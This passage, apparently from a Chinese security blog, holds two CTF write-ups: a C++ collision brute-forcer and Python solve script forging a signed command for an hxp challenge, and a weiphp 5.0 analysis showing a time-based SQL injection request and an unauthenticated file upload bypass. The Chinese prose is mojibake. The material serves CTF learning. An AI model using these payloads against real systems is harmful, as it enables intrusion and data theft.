class="keyword">uint32_t</span> c: k)</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; (first ? first = <span class="literal">false</span>, <span class="string">&quot;&quot;</span> : <span class="string">&quot; &quot;</span>) &lt;&lt; c;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="built_in">std</span>::dec &lt;&lt; <span class="string">&quot;hash count:  \x1b[35m&quot;</span> &lt;&lt; hcount &lt;&lt; <span class="string">&quot;\x1b[0m&quot;</span>;</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                    s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(hcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot; (2^\x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">&quot;\x1b[0m&quot;</span> &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;kapot count: &quot;</span> &lt;&lt; <span class="string">&quot;\x1b[35m&quot;</span> &lt;&lt; kcount &lt;&lt; <span class="string">&quot;\x1b[0m&quot;</span>;</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                    s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(kcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot; (2^\x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">&quot;\x1b[0m)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;table sizes: \x1b[35m&quot;</span></span><br><span class="line">                          &lt;&lt; tab0.size() &lt;&lt; <span class="string">&quot;\x1b[0m \x1b[35m&quot;</span></span><br><span class="line">                          &lt;&lt; tab1.size() &lt;&lt; <span class="string">&quot;\x1b[0m&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mytab.size() &lt; (<span class="number">1</span> &lt;&lt; <span class="number">20</span>))</span><br><span class="line">                mytab[k] = r;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hcount += myhcount;</span><br><span class="line">        kcount += mykcount;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="function"><span class="built_in">std</span>::lock_guard&lt;<span class="built_in">std</span>::mutex&gt; <span class="title">lck</span><span class="params">(mtx)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\r\x1b[K&quot;</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;hash count: \x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">12</span>) &lt;&lt; hcount &lt;&lt; <span class="string">&quot;\x1b[0m &quot;</span>;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(hcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;(2^\x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">&quot;\x1b[0m) | &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;kapot count: \x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">12</span>) &lt;&lt; kcount &lt;&lt; <span class="string">&quot;\x1b[0m &quot;</span>;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(kcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;(2^\x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">&quot;\x1b[0m) | &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;tables: \x1b[35m&quot;</span></span><br><span class="line">                      &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">9</span>) &lt;&lt; tab0.size() &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">                      &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">9</span>) &lt;&lt; tab1.size() &lt;&lt; <span class="string">&quot;\x1b[0m &quot;</span></span><br><span class="line">                      &lt;&lt; <span class="built_in">std</span>::flush;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::this_thread::sleep_for(<span class="built_in">std</span>::chrono::milliseconds(<span class="number">100</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\x1b[31mneed IPv4 in argv[1]\x1b[0m&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="built_in">std</span>::<span class="built_in">stringstream</span> <span class="title">ss</span><span class="params">(argv[<span class="number">1</span>])</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; v: ip) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">string</span> s;</span><br><span class="line">            <span class="built_in">std</span>::getline(ss, s, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            <span class="keyword">int</span> n = <span class="built_in">std</span>::atoi(s.c_str());</span><br><span class="line">            <span class="keyword">if</span> (n &lt; <span class="built_in">std</span>::numeric_limits&lt;<span class="keyword">uint8_t</span>&gt;::min() || n &gt; <span class="built_in">std</span>::numeric_limits&lt;<span class="keyword">uint8_t</span>&gt;::max())</span><br><span class="line">                <span class="keyword">goto</span> bad_ip;</span><br><span class="line">            v = n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ss) &#123;</span><br><span class="line">bad_ip:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\x1b[31mbad IPv4 given?\x1b[0m&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\x1b[31mneed commands in argv[2] and argv[3]\x1b[0m&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cmd0 = argv[<span class="number">2</span>];</span><br><span class="line">    cmd1 = argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">status_thread</span><span class="params">(status)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::thread&gt; ts;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; num_threads; ++i)</span><br><span class="line">        ts.push_back(<span class="built_in">std</span>::thread(go, i));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; t: ts)</span><br><span class="line">        t.join();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å¯èƒ½ä¼šæ‰¾ä¸åˆ° <code>lcrypto</code>ï¼Œç¼–è¯‘å‘½ä»¤åŠ ä¸Š lcrypto è·¯å¾„ï¼ˆæˆ‘æœ¬åœ°æ˜¯ /usr/local/opt/openssl/libï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt -L/usr/<span class="built_in">local</span>/opt/openssl/lib</span><br></pre></td></tr></table></figure><p>ä¸ go äº¤äº’çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys, requests, subprocess</span><br><span class="line"></span><br><span class="line">benign_cmd = <span class="string">&#x27;ls -l&#x27;</span></span><br><span class="line">exploit_cmd = <span class="string">&#x27;cat *&#x27;</span></span><br><span class="line"></span><br><span class="line">ip, port = sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>]</span><br><span class="line">url = <span class="string">&#x27;http://&#123;&#125;:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ip, port)</span><br><span class="line"></span><br><span class="line">my_ip = requests.get(url + <span class="string">&#x27;/ip&#x27;</span>).text</span><br><span class="line">print(<span class="string">&#x27;[+] IP: &#x27;</span> + my_ip)</span><br><span class="line"></span><br><span class="line">o = subprocess.check_output([<span class="string">&#x27;./gewalt&#x27;</span>, my_ip, benign_cmd, exploit_cmd])</span><br><span class="line">print(<span class="string">&#x27;[+] gewalt:&#x27;</span> + o.decode())</span><br><span class="line"></span><br><span class="line">payload = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> o.decode().splitlines():</span><br><span class="line">    ip, cmd = l.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    payload[<span class="string">&#x27;benign&#x27;</span> <span class="keyword">if</span> cmd == benign_cmd <span class="keyword">else</span> <span class="string">&#x27;pwn&#x27;</span>] = ip, cmd</span><br><span class="line"></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">sig  = requests.post(url + <span class="string">&#x27;/sign&#x27;</span>, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload[<span class="string">&#x27;benign&#x27;</span>][<span class="number">0</span>], <span class="string">&#x27;cmd&#x27;</span>: payload[<span class="string">&#x27;benign&#x27;</span>][<span class="number">1</span>]&#125;).text</span><br><span class="line">print(<span class="string">&#x27;[+] sig: &#x27;</span> + sig)</span><br><span class="line"></span><br><span class="line">r = requests.post(url + <span class="string">&#x27;/exec&#x27;</span>, data=&#123;<span class="string">&#x27;signature&#x27;</span>: sig[:<span class="number">172</span>] + payload[<span class="string">&#x27;pwn&#x27;</span>][<span class="number">0</span>]  + <span class="string">&#x27;|&#x27;</span> + payload[<span class="string">&#x27;pwn&#x27;</span>][<span class="number">1</span>]&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> âš™ î‚° SaV-ls-l-aaS î‚° python solve.py 127.0.0.1 60601</span><br><span class="line">[+] IP: 172.17.0.1</span><br><span class="line">fffd fffd fffd fffd fffd fffd 55 fffd fffd fffd fffd c fffd fffd fffd fffd fffd fffd fffd fffd</span><br><span class="line"><span class="built_in">hash</span> count:  168104875 (2^27.32)</span><br><span class="line">kapot count: 3477222 (2^21.73)</span><br><span class="line">table sizes: 8745 8856</span><br><span class="line">[+] gewalt:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001|ls -l</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001|cat *</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;pwn&#x27;</span>: (u<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001&#x27;</span>, u<span class="string">&#x27;cat *&#x27;</span>), <span class="string">&#x27;benign&#x27;</span>: (u<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001&#x27;</span>, u<span class="string">&#x27;ls -l&#x27;</span>)&#125;</span><br><span class="line">[+] sig: ODxSukwtu4rHICBpzT23WGD7DCJNawhA0DUN/tcyv1AgwNmS8OPUnO5FnBBDgiaVx5OTYd4OjH8LVbKiXUBUBuFx1OHDgKBKG5umkKMLt+350SlgMWY5qWny9tPIU3I+X0A9FcADCBCi6f0PkXfc0CSCZXuFu9rAKnVGsbmaUwY=00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001|ls -l</span><br><span class="line">hxp&#123;FLAG&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 XCTF FINALS weiphp5.0 æ¼æ´æŒ–æ˜</title>
      <link href="/2019/10/30/weiphp5-0/"/>
      <url>/2019/10/30/weiphp5-0/</url>
      
        <content type="html"><![CDATA[<p>åœ¨2019 XCTF FINALSï¼Œéº¦é¦™å¸ˆå‚…å‡ºäº†ä¸€ä¸ªæœ€æ–°ç‰ˆ weiphp æ¼æ´æŒ–æ˜ï¼Œå‡ºé¢˜äººè¡¨ç¤ºæ¼æ´å¤ªå¤šäº†æ‰€ä»¥åˆ äº†ä¸€éƒ¨åˆ†ä»£ç orzï¼Œé¢˜ç›®æ”¾å‡ºæ¥è²Œä¼¼è¢«æ—¥ç©¿äº†orzï¼ˆè¦æ—¥ä¸€ä¸ªcmsæœ€å¥½çš„åŠæ³•æ„Ÿè§‰æ˜¯æ”¾åˆ°CTFä¸Šï¼‰</p><a id="more"></a><p>é»˜è®¤åº”è¯¥æ˜¯å…³é—­äº†æ³¨å†ŒåŠŸèƒ½ï¼Œæ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬æ²¡æœ‰adminçš„å¯†ç æ˜¯æ— æ³•ç™»å½•çš„ã€‚</p><h2 id="å‰å°sqlæ³¨å…¥"><a href="#å‰å°sqlæ³¨å…¥" class="headerlink" title="å‰å°sqlæ³¨å…¥"></a>å‰å°sqlæ³¨å…¥</h2><p>åœ¨/application/material/controller/Material ä¸‹material_listsæ–¹æ³•ï¼ŒæŸ¥è¯¢ title å¤„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> $title = I(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">        <span class="comment">// dump($title);exit;</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($title)) &#123;</span><br><span class="line">            $map[<span class="string">&#x27;title&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;like&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;%<span class="subst">$title</span>%&quot;</span></span><br><span class="line">            );</span><br><span class="line">            $where .= <span class="string">&quot; and `title` like &#x27;%<span class="subst">$title</span>%&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">$count = M()-&gt;query(<span class="string">&quot;SELECT COUNT( distinct `group_id`) AS tp_count FROM `wp_material_news` WHERE <span class="subst">&#123;$where&#125;</span> LIMIT 1&quot;</span>);</span><br><span class="line">$count = <span class="keyword">isset</span>($count[<span class="number">0</span>][<span class="string">&#x27;tp_count&#x27;</span>]) ? $count[<span class="number">0</span>][<span class="string">&#x27;tp_count&#x27;</span>] : <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°titleæ²¡æœ‰ä»»ä½•è¿‡æ»¤æ‹¼æ¥åˆ°äº†sqlè¯­å¥é‡Œï¼Œè¿™é‡Œå› ä¸ºåªèƒ½å½±å“ count çš„å€¼ï¼Œåé¢æ˜¾ç¤ºçš„éƒ¨åˆ†è°ƒç”¨äº†æ¨¡ç‰ˆå‡½æ•°æ¥æ‰§è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥è€ƒè™‘æ—¶é—´ç›²æ³¨ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/weiphp5.0/public/index.php/Material/Material/material_lists?title=aa%27or%20sleep(5)%23</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.211.55.5</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=gh5hemmrqmujnb10fg8hs29bq8; ScanLoginKey=5db913058c905; __forward__=%2F%2Fweiphp5.0%2Fpublic%2Findex.php%2FMaterial%2FMaterial%2Fmaterial_lists%3Ftitle%3D1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1</span><br><span class="line"></span><br><span class="line"><span class="attribute">a</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¿…é¡»æ˜¯ postï¼Œget è¯·æ±‚åº”è¯¥æ˜¯ä¼šæ¸²æŸ“æ¨¡ç‰ˆä¼šè·³è½¬ç™»å½•ã€‚</p><p>å‘ç°sleepæˆåŠŸï¼Œæ‰”åˆ°sqlmapå°±å¯ä»¥äº†</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-afce833fe26311ae.png" alt="image.png"></p><p>ä¸è¿‡æ•°æ®åº“é‡Œadminçš„å¯†ç æˆ‘ä»¬ä¹Ÿæ˜¯è§£ä¸å‡ºæ¥çš„ï¼Œå› ä¸ºweiphpä½¿ç”¨å¦‚ä¸‹æ–¹æ³•å…¥åº“ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_weiphp_md5</span>(<span class="params">$str, $key = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($key)) &#123;</span><br><span class="line">        $key = config(<span class="string">&#x27;database.data_auth_key&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> === $str ? <span class="string">&#x27;&#x27;</span> : md5(sha1($str) . $key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æ—¶æ¯”èµ›çš„æ—¶å€™ï¼Œå¼€äº†debugæ¨¡å¼ï¼Œå¯¼è‡´ wp_user è¡¨é‡Œlogin_password å­—æ®µè®°å½•äº†adminçš„å¯†ç ï¼Œæ‰€ä»¥ç›´æ¥èƒ½ç™»åå°äº†ã€‚ã€‚ã€‚</p><h2 id="å…ç™»å½•æ–‡ä»¶ä¸Šä¼ "><a href="#å…ç™»å½•æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å…ç™»å½•æ–‡ä»¶ä¸Šä¼ "></a>å…ç™»å½•æ–‡ä»¶ä¸Šä¼ </h2><p>é¦–é¡µæºä»£ç é‡Œï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a94ec5b09af9dfef.png" alt="image.png"></p><p>è®¿é—®upload_dialog_urlï¼Œå‘ç°æœ‰å¯ä»¥ä¸Šä¼ ï¼ŒæŠ“åŒ…å¾—åˆ°ä¸Šä¼ åŒ…ï¼Œå‘ç°è¦ç™»å½•ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-03a037c4649dbc78.png" alt="image.png"></p><p>å®šä½fileæ§åˆ¶å™¨upload_pictureæ–¹æ³•ï¼Œå‘ç°æœ‰é‰´æƒï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_picture</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> ç”¨æˆ·ç™»å½•æ£€æµ‹</span></span><br><span class="line">        <span class="keyword">if</span> (!is_login())&#123;</span><br><span class="line">        $return = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œè¯·å…ˆç™»å½•&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> json($return);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ‰ä¸ªupload_root æ–¹æ³•æ²¡æœ‰é‰´æƒï¼Œç›´æ¥å¯ä»¥ä¸Šä¼ :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_root</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $return = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;ä¸Šä¼ æˆåŠŸ&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">/* è°ƒç”¨æ–‡ä»¶ä¸Šä¼ ç»„ä»¶ä¸Šä¼ æ–‡ä»¶ */</span></span><br><span class="line">    $File = D(<span class="string">&#x27;home/File&#x27;</span>);</span><br><span class="line">    $file_driver = strtolower(config(<span class="string">&#x27;picture_upload_driver&#x27;</span>));</span><br><span class="line">    $setting = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;rootPath&#x27;</span> =&gt; <span class="string">&#x27;./&#x27;</span> ,</span><br><span class="line">    );</span><br><span class="line">    $info = $File-&gt;upload($setting, config(<span class="string">&#x27;picture_upload_driver&#x27;</span>), config(<span class="string">&quot;upload_<span class="subst">&#123;$file_driver&#125;</span>_config&quot;</span>));</span><br><span class="line"><span class="comment">//     $info = $File-&gt;upload(config(&#x27;download_upload&#x27;), config(&#x27;picture_upload_driver&#x27;), config(&quot;upload_&#123;$file_driver&#125;_config&quot;));</span></span><br><span class="line">    <span class="comment">/* è®°å½•é™„ä»¶ä¿¡æ¯ */</span></span><br><span class="line">    <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">    $return[<span class="string">&#x27;status&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">    $return = array_merge($info[<span class="string">&#x27;download&#x27;</span>], $return);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $return[<span class="string">&#x27;status&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    $return[<span class="string">&#x27;info&#x27;</span>] = $File-&gt;getError();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* è¿”å›JSONæ•°æ® */</span></span><br><span class="line">    <span class="keyword">return</span> json_encode($return);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨php5å°±å¯ä»¥ç»•è¿‡ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-75670a9b451493ef.png" alt="image.png"></p><p>æˆåŠŸä¸Šä¼ 